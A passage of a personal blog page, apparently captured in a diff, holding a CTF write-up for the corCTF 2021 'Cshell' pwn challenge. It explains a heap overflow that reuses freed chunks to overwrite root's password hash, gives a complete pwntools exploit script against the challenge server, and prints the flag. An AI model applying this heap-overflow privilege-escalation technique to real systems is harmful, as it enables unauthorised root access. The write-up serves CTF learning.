+</span><span>	root_t</span><span style="color:#f29e74;">-&gt;</span><span>next </span><span style="color:#f29e74;">=</span><span> user_t</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">setup</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(user</span><span style="color:#f29e74;">-&gt;</span><span>name</span><span style="color:#ccc9c2cc;">,</span><span>username)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(user</span><span style="color:#f29e74;">-&gt;</span><span>passwd</span><span style="color:#ccc9c2cc;">,</span><span>hash)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(user_t</span><span style="color:#f29e74;">-&gt;</span><span>name</span><span style="color:#ccc9c2cc;">,</span><span>username)</span><span style="color:#ccc9c2cc;">;
+</span><span>	user_t</span><span style="color:#f29e74;">-&gt;</span><span>id</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">1000</span><span style="color:#ccc9c2cc;">;
+</span><span>	user_t</span><span style="color:#f29e74;">-&gt;</span><span>ptr </span><span style="color:#f29e74;">=</span><span> user</span><span style="color:#ccc9c2cc;">;
+</span><span>	user_t</span><span style="color:#f29e74;">-&gt;</span><span>next </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">menu</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>So, the first thing I noted here was that we don't need to exploit for code execution. If we can set uid to 0, it'll just give us a shell. The vulnerability is in the setup function. It asks for the length of our bio buffer, allocates a chunk of that size, and then reads 201 bytes into it for a fairly hefty heap overflow. The issue is that it's essentially the last heap chunk allocated so there isn't anything useful afterwards. We can force it to allocate an earlier chunk by taking advantage of some libc malloc behavior -- that it will reuse previously freed chunks of matching sizes. The heap layout around that area looks something like Alex -&gt; Charlie -&gt; Eric -&gt; User -&gt; Root. Both Charlie and Eric are freed chunks, which means we can get the setup to allocate those chunks again and overflow. At this point we can overwrite the saved password of root, log into root, and then ask politely for a shell.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;Cshell&quot;</span><span>)
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;pwn.be.ax&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5001</span><span>)
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        </span><span style="color:#ffa759;">return </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>({
+</span><span>        </span><span style="color:#ffcc66;">187</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;13iAJxIb3oOPs&quot; </span><span style="font-style:italic;color:#5c6773;"># &quot;hi&quot; hashed
+</span><span>    })
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;abcd&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;hi&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;120&quot;</span><span>) </span><span style="font-style:italic;color:#5c6773;"># reuse a previous freed alloc
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;root&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;hi&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;3&quot;</span><span>)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<p>The flag is corctf{tc4ch3_r3u5e_p1u5_0v3rfl0w_equ4l5_r007}</p>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">22 August 2021</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/pwn/">#pwn</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
